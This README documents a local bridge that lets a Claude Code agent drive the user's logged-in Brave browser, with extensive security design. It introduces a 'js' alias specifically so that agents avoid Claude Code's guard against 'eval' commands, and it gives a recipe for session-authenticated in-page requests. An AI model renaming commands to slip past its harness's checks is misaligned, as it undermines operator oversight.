# browser-bridge

A local, token-authenticated command channel that lets a Claude Code skill drive
the user's **real, logged-in Brave** browser. This is authorized personal
automation on the user's own workbench.

It is a **sibling** to the activity-collector's `scripts/collector/browser-ext/`
(a one-way telemetry sink). browser-bridge is a *command* channel and does not
touch the collector or its extension.

## Quick start / binary path

The executable lives at
`~/workspace/devrc/scripts/browser-bridge/browser` (also
`~/.claude/skills/browser/browser` if the skill dir is symlinked):

```bash
BB=~/workspace/devrc/scripts/browser-bridge/browser
$BB health                              # connected instances + count
$BB --instance <key> open <url>         # open a NEW tab this session owns → tabId
$BB --instance <key> --tab <id> html    # act on a specific tab
```

## Architecture

```
  Claude skill  ──HTTP POST /cmd──▶  server.py (loopback rendezvous)
   (scripts/browser-bridge/browser)        │
                                     GET /poll (long-poll) ▲   ▼ dispatch
                                            │
                                MV3 extension service_worker.js
                                  (runs in the LIVE Brave session)
                                            │
                          chrome.scripting / chrome.tabs / captureVisibleTab
                                            │
                                  POST /result  ──────────▶ back to the skill
```

Three actors, one loopback meeting point:

1. **`server.py`** — a stdlib `http.server` bound to `127.0.0.1:8788`. Holds a
   command queue and correlates each `POST /cmd` (skill) with the matching
   `POST /result` (extension) by an id.
2. **`extension/`** — a standalone MV3 extension. Its service worker long-polls
   `GET /poll`, executes the op against the active tab, and posts the result.
3. **`browser`** — the bash skill entrypoint Claude calls (`html`, `js`/`eval`,
   `tabs`, `nav`, `screenshot`, `health`, `instances`).

### Multiple instances per host

More than one Brave profile can each run the extension and be driven
independently. The server keeps a **registry of connected instances**, each with
its **own command queue** — a command for one profile is never delivered to
another's `/poll` (this is what fixes the 2× contention of the old single-queue
design when two profiles were connected).

- **Routing key.** Each instance has a stable auto-id (`crypto.randomUUID()`,
  persisted by the extension in `chrome.storage.local`) and an optional user
  **label** (set in the extension options). The effective routing key = the
  label if set, else the auto-id. **Labels are the human key and must be unique
  per host.**
- **Targeting.** With exactly one instance connected, no flag is needed
  (back-compat). With more than one and no `--instance`, a command **errors** and
  lists the connected instances (it never guesses). `browser --instance <key>
  <op>` targets one explicitly (the key matches either the label or the auto-id);
  an unknown key errors. `--instance` works for every op.
- **`browser instances`** lists the connected instances (routing key, label,
  auto-id, active-tab url/title) as JSON. `/health` also reports them.
- **`browser whoami`** (GET `/whoami`, bearer + Host guarded like `/health`, NOT
  rate-limited) is a read-only identity + diagnostics snapshot: **which HOST**
  (`host.label` ∈ `laptop`/`workbench`/`unknown`, resolved `ACTIVITY_HOST` env →
  the activity-collector env file → LAN-IP detect mirroring `ship.sh`
  `detect_role`; `host.source` names the method, `host.ips` the machine's
  non-loopback IPv4s), the connected **instances** (`key`/`label`/`instanceId`,
  the active-tab **DOMAIN** only — metadata-only, never the full URL — and the
  reported `extension_version`), and **bridge** diagnostics (`endpoint`, `port`,
  `server_version` = a `SERVER_VERSION` const + best-effort git short-HEAD,
  `connected` count, `rate_limit`, and `extension_version_current` = the manifest
  version the server reads from the repo). It answers "am I on the laptop or the
  workbench, and which profile?" in one shot (both hosts are hostname `nixos`).
  **No hard "stale" flag (by design):** the extension manifest version is not
  bumped per-change, so whoami reports both `extension_version` (loaded, per
  instance) and `extension_version_current` (repo) for you to eyeball rather than
  computing an unreliable stale verdict. The core snapshot needs **no extension
  change / no reload**; `extension_version` simply reads `null` until an extension
  build that reports its version (via the `X-Bridge-Ext-Version` poll header) has
  been reloaded.
- **Newest supersedes.** If a NEW connection (different auto-id) registers for a
  routing key that already has a live connection, the old one is dropped and any
  in-flight command on it resolves to a `superseded` error (no orphaned waiter).
  This handles a duplicate/stale connection cleanly. ⚠ Two *different* profiles
  sharing one label is a misconfiguration — **give each profile a unique label.**
  The displaced connection's own `/poll` gets a **distinct `409 superseded`
  signal** (not the idle `204`), on which the extension **backs off ~30s** (and
  surfaces a "superseded — set a unique label" state) rather than re-registering
  instantly. That deliberately breaks what would otherwise be a mutual-supersede
  **livelock** (two same-label workers re-polling at loopback speed, burning CPU
  and flooding the journal). The supersede is logged **once per displacement**,
  never per poll. (The server-side signal + once-logging are unit-tested; the
  extension's back-off can only be verified in a real browser — see below.)
- **Wire protocol.** `/poll` carries the instance identity in the
  `X-Bridge-Instance-Id` / `X-Bridge-Label` headers (+ optional
  `X-Bridge-Active-Url`/`-Title` for cheap `instances`/`health` enrichment);
  `/result` echoes its `instanceId` in the body; `/cmd` accepts an optional
  `target`. All of these stay bearer-authed and Host-checked — the security gate
  is unchanged. A legacy extension that polls with no identity is assigned one
  synthetic instance (`LEGACY_INSTANCE_ID`) so it still works unnamed.

### Transport: HTTP long-poll (not WebSocket)

An MV3 service worker can't bind a socket, so the local server is the rendezvous.
We use an **HTTP long-poll command queue**:

- The extension issues `GET /poll`, which blocks until a command is queued (or
  ~25s → `204`, then it immediately re-polls). A pending fetch keeps the MV3
  worker alive, so **the long-poll itself is the keepalive** — no RFC6455 ping.
- `POST /cmd` enqueues a command and blocks (bounded) for the reply.

Long-poll was chosen over a hand-rolled stdlib WebSocket because the whole
rendezvous stays pure `http.server` + `threading` and is **fully unit-testable
with stdlib alone** against an in-process fake extension — no new pip deps
(matching the receiver's stdlib-only footprint; the nix unit pins python312).

## Security model

The socket is loopback-only, but a malicious web page could still try to reach
it (DNS-rebinding). Two independent gates defeat that:

- **Bearer token** on *every* endpoint — the skill and the extension's long-poll
  alike. The secret is auto-created `0600` at `~/.config/browser-bridge/token`
  (`secrets.token_urlsafe`) on first start. Missing/wrong → `401`. A rebinding
  page cannot read the token file, so it cannot forge a request.
- **Host-header allowlist** — only `127.0.0.1` / `localhost` / `::1` accepted;
  anything else → `403`. A rebind victim page carries a foreign `Host`.

The extension holds `<all_urls>` host permissions + `scripting` (maximal — it
must run in whatever tab is active) and, for the CDP ops, the `debugger`
permission. This can be scoped down later; noted in `extension/README.md`. The CDP
layer's own bounded security model (own-tab-only attach, no raw-CDP passthrough,
always-detach) is in the **CDP ops** section below.

### No cookie op — deliberate (decided 2026-07-30)

There is **no `cookies` op** in the CLI, `server.py` or the extension, and the
manifest deliberately does **not** request the `cookies` permission (verified:
`permissions` is `["scripting","tabs","activeTab","storage","alarms","debugger",
"webNavigation"]`). A cookie-read op is credential exfiltration by definition —
it hands a live session token to a caller. Adding one would mean, at minimum:
hard-denying it to the autonomous browser-agent the way `upload` is (see
*opencode browser-agent*), audit-logging every read, and accepting that session
tokens land in Claude transcripts, which persist on disk. The value it buys does
not justify that, because the sanctioned alternative below covers the real use
case without any of it. **Recorded so it isn't re-litigated.**

Consequences to know:

- `document.cookie` via `eval` is the ONLY cookie surface, and it cannot see
  **HttpOnly** cookies — i.e. essentially every session/auth cookie. The cookie
  that matters is exactly the invisible one.
- On a CSP-strict origin the injected script doesn't run at all, so a cookie read
  there returns `null` with no error, indistinguishable from a broken bridge.

**Sanctioned pattern: don't extract the cookie — make the request from inside the
page.** An in-page `fetch(url, {credentials:"include"})` run through `eval`
attaches the cookies (HttpOnly included) automatically and returns only the
response data. It needs no new permission and keeps credential *values* out of
Claude's context and off disk. `eval` takes one expression, so use an async IIFE;
the promise is awaited (`chrome.scripting` on the top frame, CDP
`awaitPromise:true` for `--frame`), so you get the resolved value:

```bash
browser js '(async function(){ const r = await fetch("/api/thing", {credentials:"include"}); return JSON.stringify({status:r.status, body:(await r.text()).slice(0,500)}) })()'
```

Verified live 2026-07-30 against real Brave (laptop, both profiles):

- Same origin (`openrouter.ai`), same path, status only: `credentials:"include"`
  → **404**, `credentials:"omit"` → **401**. The differing status proves the
  HttpOnly session cookie WAS attached by the in-page fetch, with no cookie value
  ever crossing into the transcript.
- `(async function(){ return "resolved:"+(1+1) })()` → `"resolved:2"`, confirming
  the async-IIFE shape yields a resolved value, not a pending Promise.
- CSP contrast: on a `github.com` tab `browser js 'location.host'` → `null` (no
  error) while `text`/`html` work; the identical eval on `openrouter.ai` →
  `"openrouter.ai"`.

**Limitation, stated plainly:** the in-page fetch pattern does NOT work on
CSP-strict origins (GitHub, Discord, …) — no injected script runs there, so an
authenticated API call through the page is unavailable and `text`/`html` are the
only reads. (The recipe is verified mechanically and credential-wise as above; it
has not been exercised against a third-party authenticated API beyond that.)

## Ops

| op | maps to | returns |
|----|---------|---------|
| `getHtml`    | `chrome.scripting` → `document.documentElement.outerHTML`, byte-capped CLI-side (`maxBytes`, default 32768, `0`=uncapped) | `{url,title,html,truncated?,visibilityState,hidden?,note?}` |
| `text`       | `chrome.scripting` → `(selector?document.querySelector(selector):document.body).innerText`, normalized + byte-capped (`selector`/`maxBytes` optional) | `{url,title,text,truncated,visibilityState,hidden?,note?}` |
| `eval`       | top frame: `chrome.scripting.executeScript` (MAIN world) of `js`; **`--frame`: CDP `Runtime.evaluate`** in the frame's context (same-process isolated world OR OOPIF flat session) — chrome.scripting can't eval a STRING | `{url,value,frame?,visibilityState,hidden?,note?}` |
| `tabs`       | `chrome.tabs.query({})`                                   | `{tabs:[...],ownedTabId}` |
| `nav`        | `chrome.tabs.update(tab,{url})`                           | `{tabId,url}` |
| `screenshot` | **CDP `Page.captureScreenshot`** (png) — works on a BACKGROUND/occluded tab + each profile's own tab; a foreground tab uses the cheap `captureVisibleTab` fast path. `fullpage` grabs the whole document. The CLI decodes `dataUrl` to a **`.png` on disk** and prints a path, never the base64 (see below) | `{url,dataUrl,via}` |
| `open`       | `chrome.tabs.create({url,active:false})` — **background/HIDDEN** (`visibilityState:"hidden"` → Chromium throttles it → a heavy SPA won't render → reads return a shell; `browser activate` un-throttles). Reads self-announce this via `hidden`/`note` | `{tabId,url}` |
| `close`      | `chrome.tabs.remove(tabId)`                               | `{closed:tabId}` |
| `frames`     | **`chrome.webNavigation.getAllFrames`** — the tab's frames INCLUDING cross-origin OUT-OF-PROCESS iframes (OOPIFs) | `{url,title,frames:[{frameId,url,parentFrameId}]}` |
| `click`      | top frame: **CDP** `getBoundingClientRect` → `Input.dispatchMouseEvent` (trusted); `--frame`: **SYNTHETIC** click via `chrome.scripting`; `selector` required, `frame` optional | `{url,clicked,x,y,frame,trusted}` |
| `type`       | top frame: **CDP `Input.insertText`** (trusted); `--frame`: **SYNTHETIC** input via `chrome.scripting`; `text` required, `selector`/`frame` optional | `{url,typed,frame,trusted}` |
| `key`        | top frame: **CDP `Input.dispatchKeyEvent`** (trusted); `--frame`: **SYNTHETIC** key via `chrome.scripting`; one bounded key; `key` required | `{url,key,frame,trusted}` |
| `activate`   | **FOREGROUND the tab** — `chrome.tabs.update(tab,{active:true})` + `chrome.windows.update(windowId,{focused:true})`, then an OPTIONAL bounded wait-for-`status:"complete"` + paint settle (`waitMs`, clamped ≤8s; a discarded/never-completing tab returns promptly — no wedge). Loads a foreground-throttled SPA so it can be driven. **⚠ STEALS FOCUS** (the one intrusive op); **i3:** requests window focus but may not raise across workspaces (best-effort). No new permission | `{tabId,windowId,url,title,active,status}` |
| `upload`     | **CDP `DOM.setFileInputFiles`** — resolve the `<input type=file>` at `selector` to a RemoteObject, VERIFY it is a file input, then hand Chrome the ABSOLUTE `path` (Chrome reads the file itself — **no bytes cross the bridge**); `--frame` routes into a same-process iframe OR a cross-origin OOPIF (incl. a **NESTED** one — same bounded cascade + caps as `eval --frame`). Own-tab, #189-bounded, NO raw-CDP passthrough. **Data-exfil-capable → the server AUDIT-LOGS every upload** (op + target domain + path) and it is **OPERATOR-ONLY — not in the autonomous agent's default op set** (`BROWSER_AGENT_ALLOWED_OPS` opt-in only). `selector`+`path` required | `{ok,selector,frame,url,files:[basename]}` |

`open`/`close` are dispatched to the extension; `release` (drop ownership, don't
close the tab) is handled server-side and never reaches the extension.
`frames` enumerates via **`chrome.webNavigation`** and a `--frame` on the fixed-func
ops `getHtml`/`text`/`click`/`type`/`key` injects via **`chrome.scripting`** INTO
the resolved frame — this reaches CROSS-ORIGIN out-of-process iframes (OOPIFs) that
CDP `Page.getFrameTree` could NOT enumerate. **`eval --frame` is the exception: it
runs via CDP `Runtime.evaluate`, NOT `chrome.scripting`** — `chrome.scripting` runs a
serialized FUNC, so it can't evaluate an arbitrary JS STRING in the frame (it returned
`value:null`-as-success), whereas `Runtime.evaluate` runs the string in the frame's
execution context (same-process isolated world, or the OOPIF's own flat session via
`Target.setAutoAttach`) and surfaces exceptions as a clear `frame_eval_failed` error —
never a silent null. `--frame <numeric-frameId|url-substring>`
selects the frame (the identifier is the numeric webNavigation `frameId`). **Resolution
is deterministic:** an exact numeric `frameId` always wins; a URL substring is matched
**HOST-first** (against each frame's hostname before its path — so
`--frame model-benchmarking` picks the OOPIF host `model-benchmarking.civit.ai`, not the
top page's `…/run/model-benchmarking` path); a substring matching **multiple** frames
fails with `ambiguous_frame:<n> [<id>:<url>, …]` (re-issue with the numeric id) rather
than silently choosing the first. **Prefer a numeric `frameId` or a host substring.**
**Nested OOPIFs are reached** (`setAutoAttach({flatten})` isn't recursive, so the
resolver re-arms it on each attached CHILD session and walks the cascade down the frame
tree) — bounded by depth **5** / **50** targets / a ~3 s wait ceiling, each failing loud
(`oopif_depth_cap` / `oopif_target_cap` / `frame_not_found:<url>`) and a duplicate-URL
match failing `ambiguous_frame`. See the CDP section below. `screenshot`,
`eval --frame`, and TOP-frame trusted input use **CDP (chrome.debugger)** (see the CDP
section below). A `--frame` op reports the FRAME's own `url` (so a caller can confirm it
read the intended frame, not the top document). The tab-scoped ops
(`getHtml`/`text`/`eval`/`nav`/`screenshot`/`close`/`frames`/`click`/`type`/`key`/`activate`)
run against
the calling session's owned tab when it has one (see Session isolation), else the
active tab. `text` is the **cheap read**: it returns visible `innerText` (~KB)
rather than full `outerHTML` (~100s of KB) — the read the opencode browser-agent
uses. The `text` whitespace-normalization + byte-cap live in
`extension/protocol.js` (`normalizeText`, unit-tested); a `--max-bytes` cap
(default 32 KB, `0`=uncapped) truncates with a `…[truncated N bytes]` note.

### CLI output discipline (`screenshot`, `html`) and the `js` alias

Three CLI-surface behaviours — no server/extension involvement, so they need no
Brave restart:

- **`screenshot` never prints base64.** The data URL is 100s of KB (~133K–890K
  tokens per call) and is useless in an agent's context — it can't see an image
  from a data URL, it has to `Read` a `.png` anyway. So the CLI always decodes and
  writes a file: to an explicit `path` (prints just the path, unchanged), or with
  no path to a `browser-screenshot-*.png` temp file (`tempfile.gettempdir()`, so
  `TMPDIR` is honoured), printing compact JSON `{ok,path,bytes,url,via}`.
  **`--data-url`** is the explicit escape hatch that restores the old
  raw-data-URL output; it is mutually exclusive with `path`.
  Because a screenshot is a pixel-perfect image of an **authenticated** view, the
  temp file is privacy-handled rather than just dropped in a shared `/tmp`:
  - created with `tempfile.mkstemp` → `O_CREAT|O_EXCL|O_RDWR` at **mode 0600**
    (plain `open()` would inherit umask and land 0644 = world-readable), which is
    also the correct primitive against a pre-planted symlink;
  - **auto-pruned after 24h** on each `screenshot` invocation — strictly scoped to
    the `browser-screenshot-*.png` prefix in the temp dir, `lstat`-based so a
    symlink is judged as itself and only a REGULAR file is ever unlinked, and
    entirely best-effort (a prune error never fails the capture). Copy a capture
    to an explicit `path` if you need to keep it longer.
  - the payload is **validated before any write** — strict base64
    (`validate=True`; the default silently drops non-alphabet chars, so junk and
    `""` both decoded to `b""` and produced a 0-byte "successful" `.png`) plus the
    8-byte PNG signature. Both failure modes exit non-zero with a clear message
    and leave no file behind.
- **`html` is byte-capped like `text`.** `--max-bytes N`, default 32768, `0` =
  genuinely uncapped, and truncation uses the SAME convention as `normalizeText`:
  the kept prefix (cut on a UTF-8 boundary) gets `\n…[truncated N bytes]` appended
  and `truncated` is set — never silent. The cap is applied CLI-side (`cap_html`
  in `browser`) because the extension's `getHtml` has no cap; `maxBytes` is still
  sent on the wire so a future extension-side cap composes. Under the cap the
  response is passed through **byte-identically** (no reserialization, no
  `truncated` field), so an ordinary read is unchanged.
- **`js` is a first-class alias for `eval`.** Claude Code's worktree-isolation
  guard pattern-matches the literal token `eval` in a command string and REFUSES
  to run it ("this command runs a string through eval, which can't be verified to
  stay inside the worktree"). It is reacting to the WORD, not the behaviour:
  `browser eval` ships a JS string over loopback to Brave and runs it in the PAGE
  — no filesystem access, nothing that could escape the worktree. So
  worktree-isolated agents should use **`browser js '<expr>'`**. `eval` keeps
  working unchanged and is NOT deprecated (a deprecation warning would just
  re-introduce the token). **The op sent ON THE WIRE is `eval` for both
  spellings** — the extension only knows `eval`; `js` is a CLI-surface alias only.

Server envelope: `POST /cmd` → `200 {"ok":true,"result":{id,ok,data}}`, or a
structured error: `503 extension_not_connected`, `504 timeout`,
`409 ambiguous_instance` (>1 connected, no `target`), `409 no_owned_tab`
(`close` with nothing owned), `409 superseded`, `404 unknown_instance`,
`400 unknown_op|missing_field:<f>`, `400 bad_tab` (a non-numeric/non-scalar
`tab` from a raw caller — the CLI already validates `--tab`), `401 unauthorized`,
`403 bad_host`, `429 rate_limited|queue_full` (the per-instance concurrency
backstop — see below; body carries a `retry_after` hint).

## Frame ops (webNavigation + scripting) & CDP ops (debugger)

**Cross-origin frames (OOPIFs) — `frames` + `--frame`.** `frames` enumerates via
`chrome.webNavigation.getAllFrames` and `--frame` reads/input inject via
`chrome.scripting.executeScript({target:{frameIds:[id]}})`. This fixes the
cross-origin-iframe gap: under Chrome site isolation a cross-origin iframe is an
OUT-OF-PROCESS iframe (OOPIF) in its own renderer, which CDP `Page.getFrameTree` from
the top tab target does NOT enumerate — so `frames` never listed it and `--frame` could
never target it. `getAllFrames` sees OOPIFs and `scripting` injects into them (given
`<all_urls>`), with NO debugger banner. The frame identifier is the **numeric**
webNavigation `frameId`. In-frame input is **SYNTHETIC** (`isTrusted:false`) — the
reachable OOPIF path (a trusted CDP `Input.*` event from the top target can't easily
reach an OOPIF), and enough to drive most apps.

**`eval --frame` runs via CDP `Runtime.evaluate` (not `chrome.scripting`).** The
fixed-func frame ops above work because `chrome.scripting.executeScript` runs a
serialized FUNCTION. But `eval` is an arbitrary JS STRING, and routing a string through
a `func` that `new Function(src)`s it inside the frame's isolated world hits the
extension CSP / returns `value:null`-as-success — it never truly evaluates (the bug).
So `eval --frame` attaches `chrome.debugger` to the OWNED tab and resolves the target
frame's execution context by URL (the numeric webNavigation `frameId` does not map 1:1
to a CDP frame/target): a **same-process** frame is found in the top session's
`Page.getFrameTree` → `Page.createIsolatedWorld` → `Runtime.evaluate({contextId})`; a
**cross-origin OOPIF** is not in that tree → `Target.setAutoAttach({flatten:true})`
auto-attaches its target (matched by URL) → `Runtime.evaluate` in that flat session.

**Nested OOPIFs — the bounded recursive cascade.** `Target.setAutoAttach` is **NOT
recursive**: sent on a session it auto-attaches only that session's DIRECT child targets.
So a **grandchild** cross-origin iframe never produced an `attachedToTarget` on the tab's
top session and `eval --frame` on it failed `frame_not_found` (fails safe, but the
capability was missing — `text`/`html`/`click`/`type`/`key --frame` reach such a frame
because they go via `chrome.scripting`). The resolver now **re-arms `setAutoAttach` on
each attached child session** (flat mode forwards a `sessionId`), walking the cascade down
until the wanted frame's target appears. It is **ONE shared resolver**
(`resolveOopifSession`, pure + unit-tested in `extension/protocol.js`) used by BOTH
`eval --frame` and the OOPIF branch of `upload --frame` — they cannot diverge. A hostile
page can nest/spawn frames without limit, so the descent is hard-bounded, and every bound
fails LOUD rather than truncating silently or hanging:

- `OOPIF_MAX_DEPTH` = **5** levels below the tab → `oopif_depth_cap:5`;
- `OOPIF_MAX_TARGETS` = **50** distinct sessions per op → `oopif_target_cap:50`;
- attach events arrive **asynchronously** (a `setAutoAttach` reply does NOT mean its
  events landed), so the resolver waits on a quiet-window settle (`OOPIF_SETTLE_MS`,
  600 ms, RESTARTED on each newly-issued `setAutoAttach` so a slow level is never cut off
  mid-descend) under a hard ceiling (`OOPIF_WAIT_MS`, 5 s — well inside `CDP_OP_BUDGET_MS`);
  a timeout surfaces as `frame_not_found:<url>`, never a silent null and never a hang.
  The ceiling is checked **first each iteration, above the descend branch** — an earlier
  revision checked it only when there was nothing left to descend into, so a page that
  kept the queue non-empty never reached it and the real wall became `CDP_OP_BUDGET_MS`
  (surfacing as `cdp_timeout:op`). It is now a true wall;
- **ambiguity fails loud**: with nesting two frames can share a URL, so >1 matching
  attached session → `ambiguous_frame:<n> [<sessionId>:<url>, …]` (mirroring
  `resolveWebNavFrame`) instead of silently picking the first.

A match already in hand always wins over a cap hit in the same batch.

**The explicit boundary that replaces the old implicit one.** The pre-recursion code drew
part of its safety from only ever looking ONE level below a tab whose URL
`assertCdpAttachable` had validated. Recursion removes that, so every discovered target is
filtered on three axes in `onEvt` before it is tracked, descended into, or matched:

1. **Own tab / own cascade** — `chrome.debugger.onEvent` is a GLOBAL listener, so
   ownership must be PROVEN per event. When `source.tabId` is present it is authoritative
   and must equal this op's tab. When it is **absent** — which live evidence says is the
   case for SUB-session events, and which made the first cascade implementation inert at
   level 2 — ownership falls back to **session parentage**: the event's `source.sessionId`
   must be a session THIS cascade attached. An event proving neither is dropped
   (`drop:unowned`), so it still fails closed; the fallback is not blanket trust.
2. **`iframe` targets only** (`OOPIF_TARGET_TYPES`) — a page can `new Worker(location.href)`
   to mint a target with a url IDENTICAL to a real frame's. Unfiltered that lets any
   cross-origin frame permanently deny service to itself (forced `ambiguous_frame`) and,
   after a navigation race, could route the operator's JS into a WORKER global.
   `Target.setAutoAttach` is also sent with `filter:[{type:"iframe"}]` so Chrome ideally
   never attaches one at all — but that parameter is EXPERIMENTAL, so a rejection is
   caught and the call transparently retried without it (**fail-soft**); the listener-side
   check is the authoritative control and needs no protocol support.
3. **http/https only** (`isCdpAttachableUrl` — the same gate the top tab passes). Without
   it a hostile page embeds `<iframe src="chrome-extension://<id>/…">` (any extension with
   `web_accessible_resources`); `getAllFrames` lists it, and a prompt-injected agent could
   run operator JS inside ANOTHER EXTENSION'S ORIGIN — the top-tab guard bypassed by being
   one level down.

Every other existing security property is preserved: own-tab-only attach, the pre-attach
privileged-scheme refusal, always-detach, the `onEvent` listener removed in a `finally`
**inside** the resolver, no raw-CDP passthrough (the method set is unchanged — the cascade
only re-sends `Target.setAutoAttach`), and metadata-only telemetry.

**Known limitation — duplicate-URL OOPIFs have NO escape hatch.** The CDP path matches by
frame URL only (a numeric webNavigation frameId has no 1:1 CDP target mapping and is
discarded), so two identical `<iframe src="…/widget">` are both matched and the op fails
`ambiguous_frame` — and re-issuing with the numeric id, the remedy the generic `--frame`
docs give, provably cannot help here. A refusal, not a wrong frame, but a dead end for
`eval`/`upload`; the fixed-func frame ops are unaffected. **Follow-up (cheap, not done):**
the resolver already records `parentSessionId` per attached target and the caller has the
frame's `parentFrameId` chain, so a parent-chain tiebreak is implementable — it was left
out because the ancestor→session mapping is subtle when an intermediate frame is
same-process (its target IS the top session) and that cannot be validated without live
Brave.

**Failure diagnostics (`formatCascadeTrace`).** Every OOPIF failure —
`frame_not_found`/`oopif_depth_cap`/`oopif_target_cap` — appends ONE compact
`cascade[exit=… attach=… events=… accepted=… filter=… caps=…]` header plus up to
`OOPIF_TRACE_MAX` (20) per-event rows recording each observed target's `type`, whether
`source.tabId` was present and matched, whether its parent session was known, the computed
depth, and the drop reason. Bounded by construction, so a frame-spamming page cannot blow
up the error. It is **caller-facing error text only** (frame URLs appear, as they already
do in `ambiguous_frame`) and is **never** fed to telemetry, which stays metadata-only.
This exists because live run #1 failed and produced nothing to reason from; on run #2 the
trace answered the depth question in ONE command instead of another restart cycle. Keep
it — a bounded self-describing failure is the difference between a verify round and a
guess.

**✅ LIVE-VERIFIED (run #2, real Brave).** Check A: a grandchild OOPIF evaluates
correctly. Check B (7-level deep rig): depth 3 → `"deep3-reached"`, depth 5 →
`"deep5-reached"`, depth 6 → `oopif_depth_cap:5` with `exit=depth-cap events=5 accepted=5`
and **four chained sub-session auto-attaches** visible in the trace's `attach=` chain. So
the cascade descends through every permitted level, all five were attributed correctly,
and the sixth was refused: **`OOPIF_MAX_DEPTH = 5` is a real, measured guarantee, not a
contingent one.** `filter=on` in that trace also confirms Chrome accepts the experimental
`filter:[{type:"iframe"}]` param and that real OOPIFs pass the type gate.

**📌 Discovered Chrome behaviour — the durable lesson from this arc.**
**Chrome does NOT populate `source.tabId` on SUB-session `Target.attachedToTarget`
events**; they carry `sessionId` only. This is not documented anywhere obvious and it cost
a full verify round: the first implementation's fail-closed own-tab check therefore
dropped *every* level-2+ event, and the cascade went **inert** — returning
`frame_not_found` and **never** a depth cap, because no nested session was ever recorded.
"Inert, not capped" was the diagnostic signature. Hence ownership is proven by **session
parentage** (`source.sessionId` ∈ sessions this cascade attached), with `tabId` still
authoritative when present. **If you ever add a listener-side own-tab gate to a flat-mode
CDP cascade, this is the trap.**

`tests/fixtures/oopif-rig/` carries both fixtures — a 3-domain grandchild rig (Check A,
which also confirms the `iframe` type assumption by construction) and a 7-level
alternating-domain "deep" rig (Check B) that discriminates a binding depth cap from a
broken one. Its README records **both** runs — #1's failure and #2's known-good baseline
with the real trace — plus how to read the readout.

Everything is bounded by the per-op CDP timeouts (a bad frame fails fast, never wedges),
and the never-silent-null contract holds: a genuine `null`/`undefined` is returned as a
value, but a failure to execute is a clear `frame_not_found` / `frame_eval_failed:<reason>`
error. Own-tab-only + typed-op invariants are unchanged (no raw-CDP passthrough).

**CDP ops (`chrome.debugger`) — `screenshot` + TOP-frame trusted input.** These use the
Chrome DevTools Protocol via the `debugger` permission. They fix two real agent
failures: (1) `captureVisibleTab` could only grab the foreground tab (can't screenshot
a background tab or two profiles); (2) there was no trusted-input primitive to drive an
app's top frame.

**Design — per-op attach → run → always-detach.** The extension attaches
`chrome.debugger` for the single op, runs a FIXED set of CDP methods, and detaches
in a `finally` (so a thrown op still detaches). This keeps the "an extension is
debugging this browser" banner window tiny and prevents a leaked attachment.
`chrome.debugger.onDetach` clears an out-of-band detach (tab crash/close, banner
Cancel). All decision logic (attach-scope validation, the always-detach
orchestration `withCdpSession`, frame enumeration/resolution, the key/coordinate
math, the frame read-expression builders) is **pure + unit-tested** in
`extension/protocol.js` (`../tests/cdp_protocol.test.mjs`); `service_worker.js` is
only the thin `chrome.debugger` side-effect glue.

**Security model — the `debugger` permission is the biggest blast radius, so:**

1. **STRICT own-tab attach scope.** The server tab-scopes a CDP op and routes it
   ONLY to the caller's owned/`--tab` tab; the extension attaches `chrome.debugger`
   ONLY to that injected tab and **refuses to attach to a privileged surface**
   (`chrome://`, `chrome-extension://`, `devtools:`, `file:`, …) — validated
   *before* the attach (`assertCdpAttachable`, `cdp_attach_refused:<scheme>`). For
   the autonomous agent the tab is FORCED (env, not model-chosen), so it can never
   attach to another tab, another profile, or the user's active tab.
2. **NO raw-CDP passthrough to the model.** The opencode typed tool exposes ONLY the
   bounded ops with typed scalars (`op`, `selector`, `text`, `key`, `frame`, `js`,
   `url`, `maxBytes`). There is **no `cdp`/`method`/`params` field** — the model can
   never send an arbitrary CDP command (`Page.navigate file://`, `Browser.*`,
   `Target.*`, exfil `Runtime.evaluate`). `buildRequest` constructs the wire body
   from a **whitelist**, so any smuggled field is dropped, never forwarded. This
   preserves the PR #180 RCE-closed property (typed ops only, no command string).
   The extension likewise has no generic "run this CDP method" endpoint.
3. **Always detach** (per-op `finally` + `onDetach`) — no leaked attachment.
4. **Metadata-only telemetry** (see below) is unchanged: op/domain only — never
   frame URLs, typed text, eval source, or screenshot bytes. CDP ops count against
   the per-instance rate limit (#178).

**Tradeoff:** a CDP op briefly shows Brave's debug banner. A simple top-frame
`text`/`html`/`eval` or a foreground `screenshot` takes the lighter non-CDP path
(no banner). **The manifest gained the `debugger` permission → the extension needs
a manual reload** (and Brave may re-prompt for the permission).

**⚠ Reloading (↻) the extension is UNRELIABLE — a full Brave restart is the
reliable fix.** The extension's long-poll (`GET /poll`) keeps the OLD service
worker permanently alive, so clicking ↻ in `brave://extensions` frequently does
NOT swap in the new build. Symptom of a stale extension: a NEW op (e.g. `upload`
on a pre-0.2.0 build) returns a server-side op-level **`unknown_op`** — the server
knew the op and dispatched it, but the old service worker didn't. The **CLI maps
that to a clear reload/restart message + non-zero exit**, and **`browser health`
shows the loaded `extension_version` vs `extension_version_current`** so you can
confirm. If a reload doesn't take, **fully quit and reopen Brave**.

## Concurrency backstop (per-instance rate limit + queue cap)

The extension is a **single serial connection**, and the transport used to accept
`/cmd` dispatches with **no backpressure**. An audit found a 44,061-event storm —
**43,991 `eval`s in one hour (~13/sec sustained)** from an unisolated fleet/loop —
that saturated one instance's queue and ballooned latency from ~10 ms to ~5.5 s.

To bound that damage the server enforces two **per-instance** limits (the
extension is the bottleneck, so throttling instance A never affects instance B):

- **Token-bucket rate limit** on accepted `/cmd` dispatches: `BROWSER_BRIDGE_RATE_PER_SEC`
  sustained (default **5/sec**), `BROWSER_BRIDGE_BURST` burst (default **20**). A
  dispatch that would exceed the bucket is **rejected** (never silently queued).
  `RATE_PER_SEC=0` disables it (power-user unlimited). When rate-limiting is
  active (`RATE_PER_SEC>0`), `BURST` is **clamped to ≥1** — a sub-1 burst can
  never hold a whole token, so it would silently rate_limit *every* `/cmd`
  forever; use `RATE_PER_SEC=0`, not a 0 burst, to disable throttling.
- **Queue-depth cap** `BROWSER_BRIDGE_MAX_QUEUE` (default **32**): if an instance's
  pending (admitted-but-unfinished) command count is at the cap, new `/cmd` are
  rejected until it drains — this bounds the latency tail. `MAX_QUEUE=0` disables it.

A rejected dispatch returns **HTTP 429** `{"ok":false,"error":"rate_limited"|"queue_full","retry_after":<s>}`
(caller-visible backpressure). The `browser` CLI prints a back-off message and
exits non-zero, so a runaway loop gets a hard, detectable signal. **The defaults
do not hurt legitimate use:** an interactive/agent workflow is a handful of ops
per burst (well under burst 20 and depth 32); only a sustained high-rate flood is
throttled.

The admission check runs **under the existing lock**, is lock-free of any blocking
wait, and rejects **before** the command joins the per-tab FIFO turnstile — so it
can neither deadlock nor wedge the turnstile (a rejection returns immediately,
